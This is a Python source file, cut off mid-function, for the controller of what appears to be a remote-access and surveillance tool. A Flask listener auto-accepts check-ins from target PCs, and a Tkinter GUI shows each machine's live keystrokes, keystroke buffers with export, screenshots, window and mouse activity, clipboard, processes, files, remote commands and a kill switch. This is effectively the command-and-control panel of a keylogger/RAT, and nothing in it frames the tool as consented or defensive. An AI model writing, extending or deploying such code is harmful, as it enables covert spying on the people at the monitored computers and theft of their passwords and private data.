# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import json
import requests
import datetime
import os
import io
import base64
import secrets
import threading
from threading import Thread
import time
from flask import Flask, request, jsonify
from flask_cors import CORS

# ------------------------------------------------------------
# CallbackListener - based on the newer file, with robust server run
# ------------------------------------------------------------
class CallbackListener:
    """Enhanced callback listener - auto-accepts server registrations"""

    def __init__(self, client_app):
        self.client_app = client_app
        self.app = Flask(__name__)
        CORS(self.app)
        self.running = False
        self.thread = None
        self.server = None
        self.config = self.load_config()
        self.registered_servers = {}

        # Setup Flask routes
        @self.app.route('/register', methods=['POST'])
        def handle_registration():
            return self.receive_registration()

        @self.app.route('/callback', methods=['POST'])
        def handle_callback():
            return self.receive_callback()

        @self.app.route('/heartbeat', methods=['POST'])
        def handle_heartbeat():
            return self.receive_heartbeat()

    def load_config(self):
        """Load callback listener configuration"""
        config_file = "callback_listener_config.json"
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception:
                pass

        default_config = {
            "enabled": True,
            "port": 8080,
            "callback_key": secrets.token_urlsafe(32),
            "auto_update_gui": True,
            "auto_accept_servers": True,
            "require_approval": False
        }

        try:
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=4)
        except Exception:
            pass

        return default_config

    def save_config(self):
        """Save callback listener configuration"""
        with open("callback_listener_config.json", 'w', encoding='utf-8') as f:
            json.dump(self.config, f, indent=4)

    def start(self):
        """Start the callback listener"""
        if self.running:
            return False

        if not self.config.get('enabled', False):
            return False

        self.running = True
        self.thread = Thread(target=self._run_server, daemon=True)
        self.thread.start()

        local_ip = self.get_local_ip()
        port = self.config['port']

        print(f"\n{'='*70}")
        print("CALLBACK LISTENER STARTED")
        print(f"{'='*70}")
        print(f"Listening on: {local_ip}:{port}")
        print(f"Callback Key: {self.config['callback_key']}")
        print(f"\nServers should connect to:")
        print(f"  http://{local_ip}:{port}")
        print(f"{'='*70}\n")

        return True

    def get_local_ip(self):
        """Get local IP address"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def stop(self):
        """Stop the callback listener"""
        self.running = False
        try:
            if hasattr(self, 'server') and self.server:
                self.server.shutdown()
        except Exception:
            pass
        print("Callback listener stopped")

    def _run_server(self):
        """Run Flask server in background thread using make_server"""
        try:
            from werkzeug.serving import make_server
            host = '0.0.0.0'
            port = int(self.config.get('port', 8080))
            self.server = make_server(host, port, self.app, threaded=True)
            self.server.serve_forever()
        except Exception as e:
            print(f"Callback listener error: {e}")
            self.running = False

    def receive_registration(self):
        """Handle server registration"""
        try:
            callback_key = request.headers.get('X-Callback-Key')
            if callback_key != self.config['callback_key']:
                print(f"[!] Unauthorized registration attempt")
                return jsonify({"error": "Unauthorized", "status": "rejected"}), 401

            data = request.json

            if not data or data.get('type') != 'register':
                print(f"[!] Invalid registration data")
                return jsonify({"error": "Invalid registration"}), 400

            pc_id = data.get('pc_id')
            pc_name = data.get('pc_name', 'Unknown')
            server_url = data.get('server_url')
            api_key = data.get('api_key')
            capabilities = data.get('capabilities', {})

            print(f"\n{'='*70}")
            print(f"NEW SERVER REGISTRATION")
            print(f"{'='*70}")
            print(f"PC Name: {pc_name}")
            print(f"PC ID: {pc_id}")
            print(f"Server URL: {server_url}")
            print(f"Capabilities: {', '.join(k for k, v in capabilities.items() if v)}")

            if self.config.get('auto_accept_servers', True):
                self.registered_servers[pc_id] = {
                    'name': pc_name,
                    'url': server_url,
                    'api_key': api_key,
                    'registered_at': datetime.datetime.now().isoformat(),
                    'last_seen': datetime.datetime.now().isoformat(),
                    'capabilities': capabilities
                }

                # Schedule GUI update in main thread
                print(f"[*] Scheduling GUI update for {pc_name}")
                try:
                    self.client_app.after(100, lambda: self.add_server_to_gui(pc_name, server_url, api_key))
                except Exception:
                    # Fallback if client_app isn't fully initialized
                    self.add_server_to_gui(pc_name, server_url, api_key)

                print(f"Status: AUTO-ACCEPTED")
                print(f"{'='*70}\n")

                return jsonify({
                    "status": "accepted",
                    "message": "Server registered successfully"
                }), 200
            else:
                print(f"Status: PENDING APPROVAL")
                print(f"{'='*70}\n")
                self.client_app.after(0, lambda: self.show_approval_dialog(data))
                return jsonify({
                    "status": "pending",
                    "message": "Waiting for approval"
                }), 202

        except Exception as e:
            print(f"[!] Registration error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"error": str(e), "status": "error"}), 500

    def receive_heartbeat(self):
        """Handle heartbeat from server"""
        try:
            callback_key = request.headers.get('X-Callback-Key')
            if callback_key != self.config['callback_key']:
                return jsonify({"error": "Unauthorized"}), 401

            data = request.json or {}
            pc_id = data.get('pc_id')

            if pc_id in self.registered_servers:
                self.registered_servers[pc_id]['last_seen'] = datetime.datetime.now().isoformat()

            return jsonify({"status": "ok"}), 200

        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def receive_callback(self):
        """Handle incoming callback from server"""
        try:
            callback_key = request.headers.get('X-Callback-Key')
            if callback_key != self.config['callback_key']:
                return jsonify({"error": "Unauthorized"}), 401

            data = request.json

            if not data:
                return jsonify({"error": "No data received"}), 400

            pc_id = data.get('pc_id')

            # Update GUI if enabled
            if self.config.get('auto_update_gui', True):
                try:
                    self.client_app.after(0, lambda: self.client_app.process_callback_data(data))
                except Exception:
                    # If app isn't ready to use .after, call directly
                    self.client_app.process_callback_data(data)

            return jsonify({
                "status": "ok",
                "received": True,
                "timestamp": datetime.datetime.now().isoformat(),
                "commands": []
            }), 200

        except Exception as e:
            print(f"Error processing callback: {e}")
            return jsonify({"error": str(e)}), 500

    def add_server_to_gui(self, name, url, api_key):
        """Add server to GUI (called in main thread)"""
        try:
            print(f"[*] Adding server to GUI: {name}")

            # Check if server already exists
            if name in self.client_app.pc_tabs:
                print(f"[!] Server '{name}' already exists in GUI")
                return

            # Add the server tab
            print(f"[*] Creating tab for {name}")
            self.client_app.add_server_tab(name, url, api_key)

            # Save configuration
            print(f"[*] Saving server configuration")
            self.client_app.save_servers()

            # Update status
            self.client_app.update_status_bar(f"New server added: {name}")

            # Show notification
            print(f"[*] Showing notification")
            try:
                messagebox.showinfo(
                    "Server Connected",
                    f"New server '{name}' has been automatically added!\n\n"
                    f"URL: {url}\n\n"
                    f"You can now monitor this PC from the '{name}' tab."
                )
            except Exception:
                pass

            print(f"[*] Server {name} successfully added to GUI")

        except Exception as e:
            print(f"[!] Error adding server to GUI: {e}")
            import traceback
            traceback.print_exc()

    def show_approval_dialog(self, registration_data):
        """Show dialog for manual server approval"""
        try:
            pc_name = registration_data.get('pc_name', 'Unknown')
            pc_id = registration_data.get('pc_id')
            server_url = registration_data.get('server_url')
            api_key = registration_data.get('api_key')

            result = messagebox.askyesno(
                "New Server Registration",
                f"A new server wants to connect:\n\n"
                f"Name: {pc_name}\n"
                f"ID: {pc_id}\n"
                f"URL: {server_url}\n\n"
                f"Do you want to accept this connection?"
            )

            if result:
                self.add_server_to_gui(pc_name, server_url, api_key)

        except Exception as e:
            print(f"Error showing approval dialog: {e}")


# ------------------------------------------------------------
# PCMonitorClient and PCTab - integrated from the older version
# ------------------------------------------------------------
class PCMonitorClient(tk.Tk):
    """Main client application with callback listener support"""

    def __init__(self):
        super().__init__()
        self.title("PC Monitor Client - Manager Station")
        self.geometry("1200x800")
        self.minsize(800, 600)

        self.config_file = "multi_client_config.json"
        self.pc_tabs = {}

        # Create UI first
        self.create_ui()

        # Initialize callback listener
        self.callback_listener = CallbackListener(self)

        # Load saved servers
        self.load_servers()

        # Auto-start callback listener
        if self.callback_listener.start():
            self.update_status_bar("Callback listener active - Ready to accept connections")

            # Show setup instructions on first run
            try:
                if not os.path.exists("callback_listener_config.json.configured"):
                    self.after(500, self.show_first_run_instructions)
            except Exception:
                pass
        else:
            self.update_status_bar("Callback listener disabled - Enable in settings")

    def show_first_run_instructions(self):
        """Show first-run setup instructions"""
        local_ip = self.callback_listener.get_local_ip()
        port = self.callback_listener.config['port']
        key = self.callback_listener.config['callback_key']

        instructions = (
            f"MANAGER STATION SETUP COMPLETE\n\n"
            f"This client is now listening for incoming server connections.\n\n"
            f"{'='*35}\n\n"
            f"TO CONNECT A SERVER:\n\n"
            f"1. On the target PC, edit callback_config.json:\n\n"
            f'   "enabled": true,\n'
            f'   "callback_url": "http://{local_ip}:{port}",\n'
            f'   "callback_key": "{key}"\n\n'
            f"2. Restart the server\n\n"
            f"3. Server will automatically appear in a new tab!\n\n"
            f"{'='*35}\n\n"
            f"No need to manually add servers anymore!\n"
            f"They will register automatically when they connect."
        )

        try:
            messagebox.showinfo("Manager Station Ready", instructions)
        except Exception:
            print(instructions)

        # Mark as configured
        try:
            with open("callback_listener_config.json.configured", 'w', encoding='utf-8') as f:
                f.write(datetime.datetime.now().isoformat())
        except Exception:
            pass

    def process_callback_data(self, data):
        """Process incoming callback data and update GUI"""
        try:
            pc_id = data.get('pc_id')
            print(f"[*] Processing callback data for PC: {pc_id}")

            # Find the matching tab
            for name, tab in self.pc_tabs.items():
                if hasattr(tab, 'last_pc_id') and tab.last_pc_id == pc_id:
                    print(f"[*] Found matching tab: {name}")
                    tab.update_from_callback(data)
                    break
            else:
                print(f"[!] No matching tab found for PC: {pc_id}")

        except Exception as e:
            print(f"Error updating GUI from callback: {e}")
            import traceback
            traceback.print_exc()

    def update_status_bar(self, message):
        """Update main status bar"""
        try:
            self.status_var.set(message)
        except Exception:
            print(message)

    def create_ui(self):
        """Create the main UI elements"""
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Control Panel")
        self.control_frame.pack(fill=tk.X, padx=10, pady=5)

        # Add control buttons
        self.add_server_btn = ttk.Button(self.control_frame, text="Add Server", command=self.show_add_server_dialog)
        self.add_server_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.settings_btn = ttk.Button(self.control_frame, text="Settings", command=self.show_settings)
        self.settings_btn.pack(side=tk.LEFT, padx=5, pady=5)

        # Callback listener button
        self.callback_btn = ttk.Button(self.control_frame, text="Callback Listener", command=self.show_callback_settings)
        self.callback_btn.pack(side=tk.LEFT, padx=5, pady=5)

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready - Add a server to begin")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, padx=10, pady=5)

    def show_callback_settings(self):
        """Show callback listener settings dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Callback Listener Settings")
        dialog.geometry("600x500")
        dialog.transient(self)
        dialog.grab_set()

        # Current status
        status_frame = ttk.LabelFrame(dialog, text="Status")
        status_frame.pack(fill=tk.X, padx=10, pady=10)

        status_text = "ACTIVE" if self.callback_listener.running else "INACTIVE"
        ttk.Label(status_frame, text=f"Status: {status_text}", font=('Arial', 10, 'bold')).pack(pady=5)

        if self.callback_listener.running:
            ttk.Label(status_frame, text=f"Listening on port {self.callback_listener.config['port']}").pack()

        # Configuration
        config_frame = ttk.LabelFrame(dialog, text="Configuration")
        config_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Enabled checkbox
        enabled_var = tk.BooleanVar(value=self.callback_listener.config.get('enabled', False))
        ttk.Checkbutton(config_frame, text="Enable Callback Listener", variable=enabled_var).grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky=tk.W)

        # Port
        ttk.Label(config_frame, text="Port:").grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
        port_var = tk.StringVar(value=str(self.callback_listener.config.get('port', 8080)))
        ttk.Entry(config_frame, textvariable=port_var, width=20).grid(row=1, column=1, padx=10, pady=5, sticky=tk.W)

        # Callback key
        ttk.Label(config_frame, text="Callback Key:").grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
        key_var = tk.StringVar(value=self.callback_listener.config.get('callback_key', ''))
        key_entry = ttk.Entry(config_frame, textvariable=key_var, width=40)
        key_entry.grid(row=2, column=1, padx=10, pady=5, sticky=tk.W)

        # Copy key button
        def copy_key():
            try:
                self.clipboard_clear()
                self.clipboard_append(key_var.get())
                messagebox.showinfo("Copied", "Callback key copied to clipboard!")
            except Exception:
                messagebox.showinfo("Copied", "Callback key copied (fallback)")

        ttk.Button(config_frame, text="Copy Key", command=copy_key).grid(row=2, column=2, padx=5, pady=5)

        # Auto-update GUI
        auto_update_var = tk.BooleanVar(value=self.callback_listener.config.get('auto_update_gui', True))
        ttk.Checkbutton(config_frame, text="Auto-update GUI from callbacks", variable=auto_update_var).grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky=tk.W)

        # Auto-accept servers
        auto_accept_var = tk.BooleanVar(value=self.callback_listener.config.get('auto_accept_servers', True))
        ttk.Checkbutton(config_frame, text="Auto-accept new servers", variable=auto_accept_var).grid(row=4, column=0, columnspan=2, padx=10, pady=10, sticky=tk.W)

        # Instructions
        info_frame = ttk.LabelFrame(dialog, text="Setup Instructions")
        info_frame.pack(fill=tk.X, padx=10, pady=10)

        local_ip = self.callback_listener.get_local_ip()
        instructions = (
            f"1. Copy the callback key above\n"
            f"2. On each server PC, edit callback_config.json:\n"
            f'   - Set \"enabled\": true\n'
            f'   - Set \"callback_url\": "http://{local_ip}:{port_var.get()}"\n'
            f'   - Paste the callback key\n'
            f"3. Restart the server\n"
            f"4. Server will auto-register and appear in a new tab!"
        )
        ttk.Label(info_frame, text=instructions, justify=tk.LEFT).pack(padx=10, pady=10)

        # Buttons
        button_frame = ttk.Frame(dialog)
        button_frame.pack(fill=tk.X, padx=10, pady=10)

        def save_and_apply():
            try:
                self.callback_listener.config['enabled'] = enabled_var.get()
                self.callback_listener.config['port'] = int(port_var.get())
                self.callback_listener.config['callback_key'] = key_var.get()
                self.callback_listener.config['auto_update_gui'] = auto_update_var.get()
                self.callback_listener.config['auto_accept_servers'] = auto_accept_var.get()

                self.callback_listener.save_config()

                if enabled_var.get() and not self.callback_listener.running:
                    self.callback_listener.start()
                    self.update_status_bar("Callback listener started")
                elif not enabled_var.get() and self.callback_listener.running:
                    self.callback_listener.stop()
                    self.update_status_bar("Callback listener stopped")

                messagebox.showinfo("Success", "Callback listener settings saved!\n\nNote: Restart required for port changes.")
                dialog.destroy()

            except ValueError:
                messagebox.showerror("Error", "Port must be a number")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save settings: {e}")

        ttk.Button(button_frame, text="Save & Apply", command=save_and_apply).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Cancel", command=dialog.destroy).pack(side=tk.LEFT, padx=5)

    def load_servers(self):
        """Load saved server connections"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    servers = config.get('servers', [])
                    for server in servers:
                        self.add_server_tab(server['name'], server['url'], server['api_key'])
            else:
                print("No configuration found. Servers will auto-register via callback.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load servers: {str(e)}")
            print(f"Config error: {e}")

    def save_servers(self):
        """Save server connections to file"""
        try:
            servers = []
            for name, tab in self.pc_tabs.items():
                servers.append({
                    'name': name,
                    'url': tab.server_url,
                    'api_key': tab.api_key
                })

            config = {'servers': servers}
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2)

            print(f"[*] Saved {len(servers)} servers to configuration")

        except Exception as e:
            messagebox.showerror("Error", f"Failed to save servers: {str(e)}")

    def add_server_tab(self, name, url, api_key):
        """Add a new server tab"""
        try:
            print(f"[*] Creating PCTab for {name}")
            tab = PCTab(self.notebook, self, name, url, api_key)
            self.notebook.add(tab, text=name)
            self.pc_tabs[name] = tab
            print(f"[*] PCTab created and added to notebook: {name}")
            return tab
        except Exception as e:
            print(f"[!] Error creating tab: {e}")
            import traceback
            traceback.print_exc()
            return None

    def show_add_server_dialog(self):
        """Show dialog to add a new server"""
        dialog = tk.Toplevel(self)
        dialog.title("Add Server")
        dialog.geometry("400x200")
        dialog.transient(self)
        dialog.grab_set()

        ttk.Label(dialog, text="Server Name:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        name_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=name_var, width=30).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(dialog, text="Server URL:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        url_var = tk.StringVar(value="http://192.168.0.48:5000")
        ttk.Entry(dialog, textvariable=url_var, width=30).grid(row=1, column=1, padx=5, pady=5)

        ttk.Label(dialog, text="API Key:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        api_key_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=api_key_var, width=30).grid(row=2, column=1, padx=5, pady=5)

        def add_server():
            name = name_var.get().strip()
            url = url_var.get().strip()
            api_key = api_key_var.get().strip()

            if not name or not url or not api_key:
                messagebox.showerror("Error", "All fields are required")
                return

            self.add_server_tab(name, url, api_key)
            self.save_servers()
            dialog.destroy()

        ttk.Button(dialog, text="Add", command=add_server).grid(row=3, column=0, columnspan=2, pady=10)

    def show_settings(self):
        """Show settings dialog"""
        messagebox.showinfo("Settings", f"Settings file location:\n{os.path.abspath(self.config_file)}\n\nEdit manually if needed.")

    def get_current_tab(self):
        """Get the currently selected tab"""
        current = self.notebook.select()
        if current:
            return self.notebook.nametowidget(current)
        return None


class PCTab(ttk.Frame):
    """Tab for a single PC connection"""

    def __init__(self, parent, main_app, name, server_url, api_key):
        super().__init__(parent)
        self.main_app = main_app
        self.name = name
        self.server_url = server_url
        self.api_key = api_key
        self.headers = {'X-API-Key': api_key}
        self.session = requests.Session()
        self.monitoring = False
        self.auto_refresh = False
        self.auto_refresh_job = None
        self.screenshots = []
        self.last_pc_id = None  # Track PC ID for callback matching

        # Create UI
        self.create_ui()

        # Initial status update
        self.update_status()

    def update_from_callback(self, data):
        """Update tab from callback data"""
        try:
            # Update monitoring status
            self.monitoring = data.get('monitoring', False)

            # Update status display
            events_count = data.get('event_count', 0)
            keystrokes_count = data.get('keystroke_count', 0)
            pc_name = data.get('pc_name', 'Unknown')

            status = "🟢 " if self.monitoring else "🔴 "
            status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count} [CALLBACK]"
            self.status_var.set(status)

            # Update events if available
            if 'events' in data:
                self.display_callback_events(data['events'])

            # Update keystrokes if available
            if 'keystrokes' in data:
                self.display_callback_keystrokes(data['keystrokes'])

        except Exception as e:
            print(f"Error updating from callback: {e}")

    def display_callback_events(self, events):
        """Display events received from callback"""
        try:
            # Add to events text widget
            for event in events[-10:]:  # Show last 10
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                self.events_text.insert(tk.END, f"[CALLBACK] {timestamp} - {event_type}\n")

            # Auto-scroll to bottom
            self.events_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback events: {e}")

    def display_callback_keystrokes(self, keystrokes):
        """Display keystrokes received from callback"""
        try:
            # Add to keylogger text widget
            for ks in keystrokes[-20:]:  # Show last 20
                key = ks.get('key', '')
                if not key.startswith('Key.'):
                    self.keylogger_text.insert(tk.END, key)

            # Auto-scroll to bottom
            self.keylogger_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback keystrokes: {e}")

    def create_ui(self):
        """Create the tab UI elements"""
        # Create notebook for sub-tabs
        self.sub_notebook = ttk.Notebook(self)
        self.sub_notebook.pack(fill=tk.BOTH, expand=True)

        # Create sub-tabs
        self.overview_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.overview_frame, text="Overview")

        self.keylogger_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.keylogger_frame, text="Keylogger")

        self.screenshots_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.screenshots_frame, text="Screenshots")

        self.search_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.search_frame, text="Search")

        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Controls")
        self.control_frame.pack(fill=tk.X, pady=5)

        # Add control buttons
        self.refresh_btn = ttk.Button(self.control_frame, text="Refresh", command=self.refresh)
        self.refresh_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.start_btn = ttk.Button(self.control_frame, text="Start", command=self.start_monitoring)
        self.start_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.stop_btn = ttk.Button(self.control_frame, text="Stop", command=self.stop_monitoring)
        self.stop_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.snapshot_btn = ttk.Button(self.control_frame, text="Snapshot", command=self.take_snapshot)
        self.snapshot_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.kill_btn = ttk.Button(self.control_frame, text="⚠ KILL SERVER", command=self.kill_server)
        self.kill_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.auto_refresh_var = tk.BooleanVar()
        self.auto_refresh_cb = ttk.Checkbutton(self.control_frame, text="Auto-refresh",
                                               variable=self.auto_refresh_var,
                                               command=self.toggle_auto_refresh)
        self.auto_refresh_cb.pack(side=tk.LEFT, padx=5, pady=5)

        # Advanced features buttons
        self.clipboard_btn = ttk.Button(self.control_frame, text="Clipboard", command=self.show_clipboard_dialog)
        self.clipboard_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.process_btn = ttk.Button(self.control_frame, text="Processes", command=self.show_process_dialog)
        self.process_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.filesystem_btn = ttk.Button(self.control_frame, text="Files", command=self.show_filesystem_dialog)
        self.filesystem_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self.command_btn = ttk.Button(self.control_frame, text="Command", command=self.show_command_dialog)
        self.command_btn.pack(side=tk.LEFT, padx=5, pady=5)

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Not connected")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=5)

        # Initialize tabs
        self.create_overview_tab()
        self.create_keylogger_tab()
        self.create_screenshots_tab()
        self.create_search_tab()

    def toggle_auto_refresh(self):
        """Toggle auto-refresh"""
        self.auto_refresh = self.auto_refresh_var.get()
        if self.auto_refresh:
            self.schedule_auto_refresh()
        elif self.auto_refresh_job:
            self.after_cancel(self.auto_refresh_job)
            self.auto_refresh_job = None

    def schedule_auto_refresh(self):
        """Schedule next auto-refresh"""
        if self.auto_refresh:
            self.refresh()
            self.auto_refresh_job = self.after(15000, self.schedule_auto_refresh)

    def refresh(self):
        """Refresh all data"""
        self.update_status()
        self.refresh_events()
        self.refresh_screenshot()

    def update_status(self):
        """Update connection status"""
        try:
            resp = self.session.get(f"{self.server_url}/api/status", headers=self.headers, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                self.monitoring = data.get('monitoring', False)
                events_count = data.get('event_count', 0)
                keystrokes_count = data.get('keystroke_count', 0)
                pc_name = data.get('pc_name', 'Unknown')

                # Store PC ID for callback matching
                self.last_pc_id = data.get('pc_id')

                status = "🟢 " if self.monitoring else "🔴 "
                status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count}"
                self.status_var.set(status)
            else:
                self.status_var.set(f"Error: {resp.status_code}")
        except Exception as e:
            self.status_var.set(f"Connection error: {str(e)}")

    def start_monitoring(self):
        """Start monitoring on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/start", headers=self.headers)
            if resp.status_code == 200:
                self.monitoring = True
                self.update_status()
                messagebox.showinfo("Success", "Monitoring started")
            else:
                messagebox.showerror("Error", f"Failed to start monitoring: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")

    def stop_monitoring(self):
        """Stop monitoring on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/stop", headers=self.headers)
            if resp.status_code == 200:
                self.monitoring = False
                self.update_status()
                messagebox.showinfo("Success", "Monitoring stopped")
            else:
                messagebox.showerror("Error", f"Failed to stop monitoring: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")

    def take_snapshot(self):
        """Take a snapshot on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/snapshot", headers=self.headers)
            if resp.status_code == 200:
                messagebox.showinfo("Success", "Snapshot taken successfully")
                self.refresh_screenshot()
            else:
                messagebox.showerror("Error", f"Failed to take snapshot: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")

    def kill_server(self):
        """Kill the server process"""
        if messagebox.askyesno("Confirm", "This will terminate the server process. Continue?"):
            try:
                resp = self.session.post(f"{self.server_url}/api/kill", headers=self.headers, timeout=5)
                messagebox.showinfo("Success", "Server kill signal sent")
            except Exception as e:
                messagebox.showinfo("Info", "Server may have been killed (connection lost)")

    def create_overview_tab(self):
        """Create overview tab content"""
        # Split frame into two parts
        left_frame = ttk.Frame(self.overview_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.overview_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshot preview
        screenshot_frame = ttk.LabelFrame(left_frame, text="Live View")
        screenshot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshot_label = ttk.Label(screenshot_frame, text="No screenshot available")
        self.screenshot_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        refresh_screenshot_btn = ttk.Button(screenshot_frame, text="Refresh Screenshot", command=self.refresh_screenshot)
        refresh_screenshot_btn.pack(pady=5)

        # Events list
        events_frame = ttk.LabelFrame(right_frame, text="Activity Log")
        events_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.events_text = tk.Text(events_frame, wrap=tk.WORD, height=20)
        self.events_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        events_scroll = ttk.Scrollbar(events_frame, command=self.events_text.yview)
        events_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.events_text.config(yscrollcommand=events_scroll.set)

        refresh_events_btn = ttk.Button(events_frame, text="Refresh Events", command=self.refresh_events)
        refresh_events_btn.pack(pady=5)

    def refresh_screenshot(self):
        """Refresh screenshot preview"""
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/latest", headers=self.headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                img_data = base64.b64decode(data['image'])
                img = Image.open(io.BytesIO(img_data))
                img.thumbnail((640, 360), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.screenshot_label.config(image=photo, text="")
                setattr(self.screenshot_label, 'image', photo)
            else:
                self.screenshot_label.config(text="No screenshot available", image="")
        except Exception as e:
            self.screenshot_label.config(text=f"Error: {str(e)}", image="")

    def refresh_events(self):
        """Refresh events list"""
        try:
            resp = self.session.get(f"{self.server_url}/api/events", headers=self.headers, params={'limit': 50})
            if resp.status_code == 200:
                events = resp.json()
                self.events_text.delete(1.0, tk.END)
                for event in reversed(events):
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})

                    if event_type == 'key_press':
                        key = details.get('key', '')
                        window = details.get('window', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Key: {key} in {window}\n")
                    elif event_type == 'mouse_click':
                        button = details.get('button', '')
                        x = details.get('x', 0)
                        y = details.get('y', 0)
                        window = details.get('window', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Mouse {button} at ({x},{y}) in {window}\n")
                    elif event_type == 'window_change':
                        title = details.get('title', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Window: {title}\n")
                    else:
                        self.events_text.insert(tk.END, f"{timestamp} - {event_type}\n")
        except Exception as e:
            self.events_text.delete(1.0, tk.END)
            self.events_text.insert(tk.END, f"Error loading events: {str(e)}")

    def create_keylogger_tab(self):
        """Create keylogger tab content"""
        # Live keystrokes frame
        live_frame = ttk.LabelFrame(self.keylogger_frame, text="Live Keystrokes")
        live_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.keylogger_text = tk.Text(live_frame, wrap=tk.WORD, height=10)
        self.keylogger_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        keylogger_scroll = ttk.Scrollbar(live_frame, command=self.keylogger_text.yview)
        keylogger_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.keylogger_text.config(yscrollcommand=keylogger_scroll.set)

        # Controls frame
        controls_frame = ttk.Frame(self.keylogger_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        self.show_all_keys_var = tk.BooleanVar(value=False)
        show_all_keys_cb = ttk.Checkbutton(controls_frame, text="Show All Keys", variable=self.show_all_keys_var)
        show_all_keys_cb.pack(side=tk.LEFT, padx=5)

        clear_btn = ttk.Button(controls_frame, text="Clear", command=lambda: self.keylogger_text.delete(1.0, tk.END))
        clear_btn.pack(side=tk.LEFT, padx=5)

        load_btn = ttk.Button(controls_frame, text="Load Buffer", command=self.load_keystrokes)
        load_btn.pack(side=tk.LEFT, padx=5)

        export_btn = ttk.Button(controls_frame, text="Export Text", command=self.export_keystrokes)
        export_btn.pack(side=tk.LEFT, padx=5)

    def load_keystrokes(self):
        """Load keystrokes from server"""
        try:
            params = {'limit': 1000, 'format': 'text'}
            resp = self.session.get(f"{self.server_url}/api/keystrokes/buffer", headers=self.headers, params=params)
            if resp.status_code == 200:
                data = resp.json()
                self.keylogger_text.delete(1.0, tk.END)
                # if server returns dict with 'text', else try raw
                if isinstance(data, dict) and 'text' in data:
